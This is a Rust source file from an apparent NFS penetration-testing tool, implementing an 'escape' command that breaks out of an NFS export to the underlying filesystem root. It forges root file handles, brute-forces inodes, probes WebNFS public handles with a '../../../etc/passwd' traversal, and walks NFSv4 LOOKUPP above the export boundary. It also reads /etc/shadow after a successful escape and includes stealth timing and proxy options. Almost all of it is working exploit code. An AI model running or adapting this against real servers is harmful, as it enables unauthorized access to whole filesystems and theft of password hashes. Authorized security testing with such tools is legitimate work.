//! Export escape: construct a root file handle for the underlying
//! filesystem and verify it live.
//!
//! Most NFS exports trust the file handle the client presents (RFC 1094
//! S2.3.3 -- handles are bearer tokens). When the server does not validate
//! that a handle's inode falls inside the export's subtree, an attacker
//! can construct a handle pointing at the filesystem root (ext4 inode 2,
//! XFS inode 128, BTRFS subvolume 256, etc.) and read/write anything on
//! the underlying filesystem. This module is the single entry point for
//! that primitive: it prints a hex root handle which the operator passes
//! to `shell --handle` or any other module that takes `--handle HEX`.

use clap::Parser;
use colored::Colorize as _;

use crate::cli::probe::{make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::nfs3::types::FileHandle;
use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
use crate::util::stealth::StealthConfig;
use nfs_v3::FileType;

/// Escape an export to the filesystem root via subtree_check bypass.
///
/// Tries to reach the filesystem root outside the exported directory by
/// constructing a file handle with the root inode (ext4: 2, XFS: 128/64,
/// BTRFS: 256+). The server accepts the handle without verifying it is
/// within the export boundary.
///
/// Strategy (automatic, no flags needed):
///   1. Probe known root inodes for the detected filesystem type.
///   2. If those return STALE, scan inodes 2-200 -- the root is always there.
///   3. For BTRFS, enumerate subvolume IDs starting at 256.
///
/// The printed handle is verified live (GETATTR returns NFS3_OK or ACCES,
/// not STALE) before being shown. Pass it to `shell --handle` to browse
/// the full filesystem.
///
/// Examples:
///   nfswolf escape 192.168.1.10:/srv
///   nfswolf escape 192.168.1.10 --export /srv --btrfs-subvols 32
#[derive(Parser)]
pub(crate) struct EscapeArgs {
    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export in the positional target)
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Number of BTRFS subvolume IDs to try (starting at 256)
    #[arg(long, default_value_t = DEFAULT_BTRFS_SUBVOLS, value_name = "N", help_heading = H_BEHAVIOR)]
    pub btrfs_subvols: u32,

    /// Inode scan depth for the fallback brute-force pass.
    /// The root inode is always within the first 200 inodes on any Linux
    /// filesystem, so the default covers all practical cases.
    #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_root_scan: u32,
}

/// Default BTRFS subvolume scan count. Shared with `scan --auto-escape` so the
/// auto pass uses the same depth as a manual `escape` invocation.
pub(crate) const DEFAULT_BTRFS_SUBVOLS: u32 = 16;

/// Default inode-scan depth for the escape fallback pass. The root inode is
/// always within the first 200 inodes on any Linux filesystem. Shared with
/// `scan --auto-escape`.
pub(crate) const DEFAULT_MAX_ROOT_SCAN: u32 = 200;

/// Outcome of an escape attempt against a single export.
///
/// Returned by [`find_escape`] so callers decide how to render it: the `escape`
/// subcommand prints a verbose report (and reads /etc/shadow on success), while
/// `scan --auto-escape` prints a one-line-per-export summary.
#[derive(Debug)]
pub(crate) enum EscapeOutcome {
    /// A filesystem-root handle was constructed and verified live (GETATTR
    /// returned NFS3_OK on a directory, or ACCES -- format accepted).
    Success {
        /// The verified root handle plus its filesystem fingerprint.
        candidate: EscapeResult,
        /// How the handle was found (e.g. "verified", "found via scan").
        note: String,
    },
    /// WebNFS public handle accepted -- MOUNT bypass confirmed via
    /// multi-component LOOKUP path traversal (RFC 2054 sec. 5, 6;
    /// C702 Appendix E).  The server processes slash-delimited paths in a
    /// single LOOKUP against the well-known public handle, bypassing the
    /// MOUNT protocol entirely.
    WebNfs {
        /// The public handle the server accepted (zero-length for v3,
        /// all-zero 32 bytes for v2).
        public_handle: FileHandle,
        /// NFS version that accepted the public handle.
        version: &'static str,
    },
    /// NFSv4 LOOKUPP traversal escape -- reached the filesystem root by
    /// chaining parent-directory lookups above the export boundary
    /// (RFC 7530 S16.14). The server did not enforce subtree_check, so
    /// repeated LOOKUPP walked from the export root up to the real
    /// filesystem root.
    Nfs4Lookupp {
        /// The file handle pointing at the filesystem root, obtained via
        /// GETFH after LOOKUPP traversal stabilised.
        root_handle: FileHandle,
    },
    /// Handle format is valid (STALE hits) but the root inode was not found
    /// within `2..=max_root_scan` -- a higher `--max-root-scan` may help.
    StaleNoRoot,
    /// The server rejected the handle format entirely (BADHANDLE): the export
    /// is not escapable with this technique (non-Linux server, signed handles).
    Unsupported,
}

/// Run the escape command.
pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let target = crate::cli::target::parse(&args.target, args.export.as_deref(), None, true)?;
    let host = target.host.to_string();
    let export = target.export().unwrap_or("/").to_owned();

    run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
    crate::cli::emit_replay(globals);
    Ok(())
}

/// Strategy (fully automatic, no flags needed):
///   0. Probe WebNFS public handles (cheapest -- one LOOKUP, no MOUNT needed).
///   1. Mount the export and detect the filesystem type from the handle format.
///   2. Probe known root inodes for the detected type.
///   3. If all known candidates return STALE, fall back to scanning
///      inodes 2..=max_root_scan.
///
/// The printed handle is confirmed live (GETATTR returns NFS3_OK or ACCES) before
/// being shown. ACCES counts as a hit -- the handle format is valid; only the
/// credential is rejected.
async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));

    // Phase 0: WebNFS public handle probe -- cheapest path, no MOUNT needed.
    // One LOOKUP per NFS version with a well-known constant handle (RFC 2054
    // sec. 5, 6). Falls through silently when the server does not support WebNFS.
    if let Some(outcome) = try_webnfs_escape(host, globals).await {
        if let EscapeOutcome::WebNfs { ref public_handle, version } = outcome {
            print_webnfs_success(public_handle, version, host);
        }
        return Ok(());
    }

    // Try NFSv3 first; fall back to NFSv2 if MOUNT v3 fails.
    let result = find_escape(host, export, btrfs_subvols, max_root_scan, globals, true).await;
    let (probe_client, outcome) = match result {
        Ok(r) => r,
        Err(v3_err) => {
            eprintln!("{}", crate::output::status_info("MOUNT v3 failed; trying NFSv2 escape"));
            let outcome = match find_escape_v2(host, export, max_root_scan, globals).await {
                Ok(o) => o,
                Err(v2_err) => {
                    eprintln!("{}", crate::output::status_err("MOUNT failed on both v3 and v1 -- export may not exist or server is unreachable"));
                    eprintln!("  v3: {v3_err}");
                    eprintln!("  v1: {v2_err}");
                    return Ok(());
                },
            };
            match outcome {
                EscapeOutcome::Success { candidate, note } => {
                    print_escape_success(&candidate, &note, host);
                },
                EscapeOutcome::WebNfs { public_handle, version } => {
                    print_webnfs_success(&public_handle, version, host);
                },
                EscapeOutcome::Nfs4Lookupp { root_handle } => {
                    print_nfs4_lookupp_success(&root_handle, host);
                },
                EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
                    // v2 handle construction failed -- try v4 LOOKUPP as last resort.
                    if let Some(v4_outcome) = try_nfs4_escape(host, globals).await {
                        if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4_outcome {
                            print_nfs4_lookupp_success(root_handle, host);
                        }
                        return Ok(());
                    }
                    if matches!(outcome, EscapeOutcome::StaleNoRoot) {
                        eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}.")));
                    } else {
                        eprintln!("{}", crate::output::status_err("NFSv2: handle format rejected or export is already the filesystem root."));
                    }
                },
            }
            return Ok(());
        },
    };

    match outcome {
        EscapeOutcome::Success { candidate, note } => {
            print_escape_success(&candidate, &note, host);
            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
        },
        EscapeOutcome::WebNfs { public_handle, version } => {
            print_webnfs_success(&public_handle, version, host);
        },
        EscapeOutcome::Nfs4Lookupp { root_handle } => {
            print_nfs4_lookupp_success(&root_handle, host);
        },
        EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
            // v3 handle construction failed -- try v4 LOOKUPP as last resort.
            if let Some(v4_outcome) = try_nfs4_escape(host, globals).await {
                if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4_outcome {
                    print_nfs4_lookupp_success(root_handle, host);
                }
                return Ok(());
            }
            if matches!(outcome, EscapeOutcome::StaleNoRoot) {
                eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
            } else {
                eprintln!("{}", crate::output::status_err("Export escape not available -- the export already is the filesystem root, or the server rejected the handle format (BADHANDLE / non-Linux)"));
            }
        },
    }
    Ok(())
}

/// Try NFSv3 escape first, then NFSv2 fallback, then NFSv4 LOOKUPP.
/// Returns just the outcome (no client). Used by `scan --auto-escape`
/// which doesn't need the client for post-escape reads.
pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
    // Phase 0: WebNFS public handle probe -- one LOOKUP, no MOUNT needed.
    if let Some(outcome) = try_webnfs_escape(host, globals).await {
        return Ok(outcome);
    }
    let outcome = match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
        Ok((_client, o)) => o,
        Err(_) => match find_escape_v2(host, export, max_root_scan, globals).await {
            Ok(o) => o,
            Err(_) => {
                // Both MOUNT protocols failed -- try NFSv4 LOOKUPP (no MOUNT needed).
                return Ok(try_nfs4_escape(host, globals).await.unwrap_or(EscapeOutcome::Unsupported));
            },
        },
    };

    // If v3/v2 handle construction didn't succeed, try v4 LOOKUPP as a
    // fundamentally different escape mechanism before giving up.
    match outcome {
        EscapeOutcome::Success { .. } | EscapeOutcome::WebNfs { .. } | EscapeOutcome::Nfs4Lookupp { .. } => Ok(outcome),
        EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
            if let Some(v4) = try_nfs4_escape(host, globals).await {
                Ok(v4)
            } else {
                Ok(outcome)
            }
        },
    }
}

/// Try WebNFS public handle escape (RFC 2054 sec. 5, 6; C702 Appendix E).
///
/// WebNFS defines well-known "public" file handles that bypass MOUNT:
/// - NFSv3: zero-length opaque (empty `nfs_fh3`)
/// - NFSv2: all-zero 32 bytes (`[0u8; 32]`)
///
/// A multi-component LOOKUP sends an entire slash-delimited path in one LOOKUP
/// call against the public handle.  A WebNFS server splits the name at `/`
/// boundaries; a non-WebNFS server rejects the filename (contains `/`) and we
/// fall through.  One LOOKUP call per version -- cheap and non-destructive.
async fn try_webnfs_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    // Multi-component LOOKUP: slashes in a single LOOKUP name are what makes
    // this "multi-component" -- the WebNFS server splits them (C702 App. E).
    let traversal = "../../../etc/passwd";

    // NFSv3: zero-length FileHandle is the WebNFS public handle (RFC 2054 sec. 6).
    let (_, _, v3_client) = make_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
    let public_v3 = FileHandle::from_bytes(&[]);
    if v3_client.resolve(&public_v3, traversal).await.is_ok() {
        tracing::info!("WebNFS public handle accepted on NFSv3 -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: public_v3, version: "v3" });
    }

    // NFSv2: all-zero 32-byte handle is the WebNFS public handle (RFC 2054 sec. 5).
    let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
    let public_v2 = nfs_v2::Nfs2FileHandle([0u8; 32]);
    if v2_client.lookup(&public_v2, traversal).await.is_ok() {
        tracing::info!("WebNFS public handle accepted on NFSv2 -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&public_v2.0), version: "v2" });
    }

    // NFSv4: PUTPUBFH sets the current FH to the server's public handle (op 23,
    // RFC 7530 S16.21). Follow with a multi-component LOOKUP of a traversal path
    // and GETFH. If the server processes the traversal, the public handle with
    // path traversal works -- MOUNT bypass confirmed.
    if let Some(outcome) = try_webnfs_v4(addr, traversal, globals.proxy.as_deref()).await {
        return Some(outcome);
    }

    None
}

/// NFSv4 public filehandle probe: PUTPUBFH -> LOOKUP(traversal) -> GETFH.
///
/// RFC 7530 S16.21 defines PUTPUBFH (op 23) as the v4 analogue of the WebNFS
/// public handle. If the server accepts the compound and returns a file handle,
/// the public FH with path traversal is confirmed -- no MOUNT needed.
async fn try_webnfs_v4(addr: std::net::SocketAddr, traversal: &str, proxy: Option<&str>) -> Option<EscapeOutcome> {
    use crate::proto::nfs4::compound::Nfs4DirectClient;
    use crate::proto::nfs4::types::{ArgOp, ResOpData};

    // Connect with AUTH_SYS uid=0 (most servers require at least AUTH_SYS).
    let mut client = match Nfs4DirectClient::connect_with_auth_proxy(addr, 0, 0, "localhost", proxy).await {
        Ok(c) => c,
        Err(_) => match Nfs4DirectClient::connect_proxy(addr, proxy).await {
            Ok(c) => c,
            Err(_) => return None,
        },
    };

    // NFSv4 LOOKUP processes one component at a time (no slashes), but
    // PUTPUBFH per RFC 7530 S16.21.5 allows the server to apply multi-component
    // lookup rules when the name contains slashes, similar to WebNFS for v2/v3.
    // Try the traversal as a single LOOKUP name first (slash-aware servers split it),
    // then fall back to component-by-component LOOKUPs for the same path.
    let ops = vec![ArgOp::Putpubfh, ArgOp::Lookup(traversal.to_owned()), ArgOp::Getfh];
    if let Ok(res) = client.compound(ops).await
        && res.status == 0
        && let Some(fh_data) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
    {
        tracing::info!("WebNFS public handle accepted on NFSv4 (single LOOKUP) -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&fh_data), version: "v4" });
    }

    // Component-by-component: PUTPUBFH -> LOOKUP("..") -> LOOKUP("..") -> ... -> LOOKUP("etc") -> LOOKUP("passwd") -> GETFH
    let components: Vec<&str> = traversal.split('/').filter(|c| !c.is_empty()).collect();
    let mut ops = Vec::with_capacity(components.len() + 2);
    ops.push(ArgOp::Putpubfh);
    for comp in &components {
        ops.push(ArgOp::Lookup((*comp).to_owned()));
    }
    ops.push(ArgOp::Getfh);
    if let Ok(res) = client.compound(ops).await
        && res.status == 0
        && let Some(fh_data) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
    {
        tracing::info!("WebNFS public handle accepted on NFSv4 (component LOOKUP) -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&fh_data), version: "v4" });
    }

    None
}

/// Print a WebNFS escape success report.
fn print_webnfs_success(public_handle: &FileHandle, version: &str, host: &str) {
    let hex = public_handle.to_hex();
    println!();
    println!("  {}  WebNFS public handle accepted -- MOUNT bypass (NFS{version})", "[+]".bold().green());
    println!("  {}  Multi-component LOOKUP path traversal confirmed (RFC 2054; C702 App. E)", "    ".dimmed());
    if hex.is_empty() {
        // NFSv3 zero-length handle: print a hint rather than an empty string.
        crate::output::print_handle("Public handle", "(zero-length -- pass empty string to --handle)");
    } else {
        crate::output::print_handle("Public handle", &hex);
    }
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// NFSv3 export-escape primitive.
///
/// Mounts `host:export`, builds a uid=0 probe client, and searches for a working
/// filesystem-root handle (ext4/XFS known inodes first, then BTRFS subvolumes, then a
/// fallback inode scan). Returns the probe client -- so the caller can perform
/// post-escape reads such as /etc/shadow -- together with the [`EscapeOutcome`].
///
/// Per-candidate progress lines are written to stderr only when `announce` is
/// set. Bulk callers (`scan --auto-escape`) pass `false` and print their own
/// one-line-per-export summary instead.
pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<(Nfs3Client, EscapeOutcome)> {
    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mount = make_mount_client(globals);
    let mnt = mount.mount(addr, export).await?;

    // Honour the global stealth delay on the probe path (every RPC path must
    // respect StealthConfig); with the default --delay 0 this is a no-op.
    // `globals.nfs_port` routes the probe client straight to the NFS port when
    // portmapper is firewalled.
    let (_, _, probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], StealthConfig::new(globals.delay, globals.jitter), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);

    // The export root's own inode. A candidate handle that resolves to this same
    // inode has crossed no boundary (whole-filesystem export, incl. the
    // compound-UUID XFS case `export_is_fs_root` cannot fingerprint), so it must
    // not be reported as an escape (#22/#48). `None` when root_squash blocks the
    // uid=0 GETATTR -- then we fall back to the format/known-inode signals.
    let export_fileid: Option<u64> = match probe_client.attrs(&mnt.handle).await {
        Ok(a) => Some(a.fileid),
        _ => None,
    };

    // Guard: if the export already IS the filesystem root there is nothing outside the
    // export to reach -- reconstructing inode 2 / 128 just reproduces a handle inside the
    // export, whose GETATTR (OK+NF3DIR) would otherwise be reported as a bogus "escape
    // successful". Short-circuit here so the guard covers Phase 1 AND the Phase-2 scan
    // (nfs_analyze applies the same `export_fileid in [2, 128]` check).
    if export_is_fs_root(&probe_client, &mnt.handle).await {
        if announce {
            eprintln!("{}", crate::output::status_info(&format!("Export {host}:{export} already is the filesystem root -- nothing outside the export to reach")));
        }
        return Ok((probe_client, EscapeOutcome::Unsupported));
    }

    // --- Phase 1: known root inodes, ordered ext4 -> XFS -> BTRFS ---

    // ext4 (inode 2) and XFS candidates (128/64/32) first -- cheapest probes.
    let known: Vec<EscapeResult> = FileHandleAnalyzer::construct_root_candidates(&mnt.handle);
    for candidate in &known {
        if announce {
            eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
        }
        if probe_escape_candidate(&probe_client, candidate, export_fileid, &mnt.handle).await {
            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "verified".to_owned() }));
        }
    }

    // BTRFS subvolume IDs (5, then 256..256+btrfs_subvols) last -- more expensive.
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
    let mut announced = std::collections::HashSet::with_capacity(btrfs.len());
    for candidate in &btrfs {
        if announce && announced.insert(candidate.inode_number) {
            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
        }
        if probe_escape_candidate(&probe_client, candidate, export_fileid, &mnt.handle).await {
            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified)".to_owned() }));
        }
    }

    // --- Phase 2: fallback scan (inodes 2..=max_root_scan) ---
    if announce && !known.is_empty() {
        eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- scanning inodes 2..={max_root_scan}")));
    }

    let seed = &mnt.handle;
    let mut found_stale = false;

    for inode in 2..=max_root_scan {
        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else {
            continue;
        };

        match probe_client.attrs(&candidate.root_handle).await {
            Ok(a) if a.file_type == FileType::Directory => {
                // A directory hit alone is not the root: inode numbers are dynamic
                // (XFS), so the first directory in 2..200 can be an arbitrary
                // subdirectory. Confirm it is not the export itself (identity) and
                // is genuinely the filesystem root (its own parent) before
                // declaring success (#27).
                let self_id = a.fileid;
                if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&probe_client, &candidate.root_handle, self_id).await {
                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root)".to_owned() }));
                }
                found_stale = true; // valid format + directory, but not the root -- keep scanning
                tracing::debug!(inode, "scan hit a directory but not the filesystem root -- continuing");
            },
            Ok(_) => {
                tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
            },
            Err(ref e) if e.is_permission_denied() => {
                // ACCES proves only that the handle FORMAT was accepted (root_squash blocks
                // the uid=0 read) -- it is returned by ANY protected inode, so a bare ACCES
                // is NOT proof that this inode is a directory, let alone the filesystem root.
                // Confirm positively before declaring success; otherwise a random 0700
                // subdirectory in the scan range would be mislabelled as the root.
                found_stale = true; // the format is valid even when root cannot be confirmed
                if confirm_root_dir(&probe_client, &candidate).await {
                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root dir; root_squash active)".to_owned() }));
                }
                tracing::debug!(inode, "ACCES but root not confirmed -- continuing scan");
            },
            Err(ref e) if e.is_stale() => {
                found_stale = true;
                tracing::debug!(inode, "STALE");
            },
            Err(e) => {
                tracing::debug!(inode, err = %e, "probe rejected");
            },
        }
    }

    let outcome = if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported };
    Ok((probe_client, outcome))
}

/// True when the exported directory is itself the filesystem root (so there is nothing
/// outside the export to reach).
///
/// Uses fileid + directory-type heuristics. A directory export with fileid 2 is ext4
/// root; fileid 32/64/128 is XFS root (these are never regular directories on any FS).
/// The parent-is-self test (LOOKUP "..") is NOT used here because NFS servers clip
/// ".." at the export boundary, making every export look like a root.
async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bool {
    let Ok(ok) = client.attrs(mount_handle).await else {
        return false;
    };
    if ok.file_type != FileType::Directory {
        return false;
    }
    let export_inode = ok.fileid;
    // ext4/ext3/ext2: root is always inode 2.
    // XFS: root is 128 (v5, default), 64 (v4 512B inodes), or 32 (v4 1024B inodes).
    // On ext4, inodes 32/64/128 are metadata (journal, resize_inode) -- never directories.
    // So a directory with fileid in {2, 32, 64, 128} is unambiguously a filesystem root.
    if matches!(export_inode, 2 | 32 | 64 | 128) {
        return true;
    }
    // BTRFS: every subvolume root has fileid 256, so fileid alone can't distinguish
    // "export IS the FS_TREE root" from "export is a user subvolume that could escape
    // to FS_TREE." Let the probe phase handle BTRFS -- it will try FS_TREE (subvol 5)
    // and other subvols, and the identity check blocks self-matches.
    false
}

/// Probe a candidate handle with GETATTR and report whether it is a valid directory.
///
/// Two acceptance conditions:
/// - `NFS3_OK` AND `file_type == NF3DIR` -- handle is valid and points to a directory.
///   The directory check prevents false positives from non-root inodes that happen to
///   exist (on ext4, inode 128 is the journal file, not a directory).
/// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
///   blocks uid=0 reads on the root dir).
async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &FileHandle) -> bool {
    match client.attrs(&candidate.root_handle).await {
        Ok(a) => {
            if a.file_type != FileType::Directory {
                return false;
            }
            // For BTRFS, different subvolumes share the same root fileid (256 =
            // BTRFS_FIRST_FREE_OBJECTID), so fileid alone can't distinguish them.
            // Compare handle bytes: different handles = different subvolumes = escape.
            if candidate.root_handle.as_bytes() == export_handle.as_bytes() {
                return false;
            }
            // For non-BTRFS: a matching fileid means the constructed handle resolves
            // to the export's own root directory (whole-filesystem export).
            if candidate.fs_type != crate::engine::file_handle::FsType::Btrfs && export_fileid.is_some_and(|exp| a.fileid == exp) {
                return false;
            }
            true
        },
        Err(ref e) if e.is_permission_denied() => true,
        _ => false,
    }
}

/// Definitive filesystem-root test for a fallback-scan directory hit: the root is
/// its own parent, so LOOKUP ".." resolves back to the same inode. A subdirectory
/// in the scan range (e.g. an XFS export with non-standard geometry) has a
/// different parent and is therefore rejected (#27).
async fn scan_hit_is_root(client: &Nfs3Client, handle: &FileHandle, self_fileid: u64) -> bool {
    // A filesystem root is its own parent, so ".." resolving back to the same
    // inode is the confirmation. The server may or may not return attributes
    // with the LOOKUP; fall back to a GETATTR when it does not.
    let Ok((parent, attrs)) = client.resolve(handle, "..").await else { return false };
    let parent_id = match attrs {
        Some(a) => a.fileid,
        None => match client.attrs(&parent).await {
            Ok(a) => a.fileid,
            Err(_) => return false,
        },
    };
    parent_id == self_fileid
}

/// Positively confirm a scan-hit candidate is a directory (ideally the filesystem root)
/// before accepting a bare ACCES as an escape.
///
/// During the fallback inode scan a uid=0 GETATTR returns ACCES whenever root_squash
/// blocks the read -- but EVERY protected inode returns ACCES, so ACCES alone is not
/// proof of root (it would otherwise mark a random 0700 subdirectory as the filesystem
/// root). Re-probe as the conventional root_squash anon identity (uid/gid 65534): the
/// real root dir is world-traversable (mode 0755), so a NF3DIR GETATTR -- or a successful
/// LOOKUP of a customary top-level entry (etc/bin/usr/...), which only the filesystem root
/// carries -- gives the positive signal a bare ACCES lacks.
async fn confirm_root_dir(client: &Nfs3Client, candidate: &EscapeResult) -> bool {
    // root_squash conventionally maps root -> anonuid 65534 (nobody); claim it directly so
    // perms on the root dir (0755) are evaluated against an ordinary unprivileged uid.
    let cred = Credential::Sys(AuthSys::with_groups(65534, 65534, &[65534], client.machinename()));
    let unpriv = client.with_credential(cred, 65534, 65534);

    // Positive signal 1: the handle resolves to a directory for a non-root uid.
    if let Ok(a) = unpriv.attrs(&candidate.root_handle).await
        && a.file_type == FileType::Directory
    {
        return true;
    }

    // Positive signal 2: a customary top-level entry resolves -- only the real filesystem
    // root carries these, so a successful LOOKUP confirms root.
    for name in ["etc", "bin", "usr", "var", "lib"] {
        if unpriv.resolve(&candidate.root_handle, name).await.is_ok() {
            return true;
        }
    }
    false
}

/// Print the successful escape result and next-step hints.
fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// NFSv4 LOOKUPP escape: traverse parent directories to reach the filesystem root.
///
/// NFSv4 LOOKUPP (op 16, RFC 7530 S16.14) resolves the parent directory of the
/// current file handle. A compliant server returns NFS4ERR_NOENT at the export
/// boundary, preventing traversal outside the exported subtree. Servers that do
/// not enforce subtree_check (or have a misconfigured pseudo-filesystem) allow
/// LOOKUPP to walk above the export root into the real filesystem.
///
/// The approach: obtain the pseudo-root FH via PUTROOTFH, then issue
/// PUTFH(current) + LOOKUPP + GETFH in a loop until the handle stops changing
/// (the filesystem root is its own parent). If the final handle differs from
/// the export root handle, the export boundary has been crossed.
///
/// No MOUNT protocol is needed -- NFSv4 connects directly to port 2049.
async fn try_nfs4_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
    use crate::proto::nfs4::compound::Nfs4DirectClient;
    use crate::proto::nfs4::types::{ArgOp, ResOpData};

    /// Safety cap on LOOKUPP traversal depth to prevent infinite loops on
    /// misbehaving servers.
    const MAX_DEPTH: usize = 64;

    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    // Connect with AUTH_SYS uid=0 first (most permissive); fall back to AUTH_NONE.
    let mut client = match Nfs4DirectClient::connect_with_auth_proxy(addr, 0, 0, "localhost", globals.proxy.as_deref()).await {
        Ok(c) => c,
        Err(_) => match Nfs4DirectClient::connect_proxy(addr, globals.proxy.as_deref()).await {
            Ok(c) => c,
            Err(_) => return None,
        },
    };
    client = client.with_stealth(stealth);

    // Get the pseudo-root FH (PUTROOTFH + GETFH). On Linux knfsd this is the
    // export's root directory when the export is the only one; on servers with
    // a real pseudo-filesystem it is the synthetic root.
    let export_fh = client.get_root_fh().await.ok()?;

    // LOOKUPP loop: traverse parent directories until the handle stabilises
    // or the server rejects the request (NFS4ERR_NOENT at the boundary).
    let mut current_fh = export_fh.clone();
    let mut depth: usize = 0;

    loop {
        if depth >= MAX_DEPTH {
            tracing::debug!("NFSv4 LOOKUPP hit depth cap ({MAX_DEPTH}) -- aborting");
            return None;
        }

        let ops = vec![ArgOp::Putfh(current_fh.clone()), ArgOp::Lookupp, ArgOp::Getfh];
        let res = client.compound(ops).await.ok()?;

        if res.status != 0 {
            // LOOKUPP failed -- likely NFS4ERR_NOENT at the export boundary.
            if depth == 0 {
                tracing::debug!(status = res.status, "NFSv4 LOOKUPP failed on first attempt -- export boundary enforced");
                return None;
            }
            // Traversed at least one level before hitting the wall; current_fh
            // is as high as we got.
            break;
        }

        // Extract the parent FH from the GETFH result.
        let parent_fh = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })?;

        // Handle stopped changing -- we've reached the filesystem root
        // (the root directory is its own parent).
        if parent_fh == current_fh {
            break;
        }

        current_fh = parent_fh;
        depth += 1;
    }

    // If the final handle is the same as the export root, the export already IS
    // the filesystem root -- nothing to escape to.
    if current_fh == export_fh {
        tracing::debug!("NFSv4 LOOKUPP: export already is the filesystem root");
        return None;
    }

    // Verify by looking up a well-known top-level directory entry (etc, bin, ...).
    // Even if verification fails the handle is still above the export, so report
    // it -- the operator can decide whether to use it.
    let verified = verify_nfs4_root(&mut client, &current_fh).await;
    if verified {
        tracing::info!(depth, "NFSv4 LOOKUPP escape confirmed -- filesystem root reached");
    } else {
        tracing::info!(depth, "NFSv4 LOOKUPP escape: reached handle above export root (root not positively confirmed)");
    }

    let root_handle = FileHandle::from_bytes(&current_fh);
    Some(EscapeOutcome::Nfs4Lookupp { root_handle })
}

/// Verify an NFSv4 file handle points to the filesystem root by attempting to
/// LOOKUP customary top-level entries (etc, bin, usr, var, lib). A successful
/// LOOKUP of any of these confirms the handle is the real filesystem root.
async fn verify_nfs4_root(client: &mut crate::proto::nfs4::compound::Nfs4DirectClient, fh: &[u8]) -> bool {
    use crate::proto::nfs4::types::ArgOp;

    for name in ["etc", "bin", "usr", "var", "lib"] {
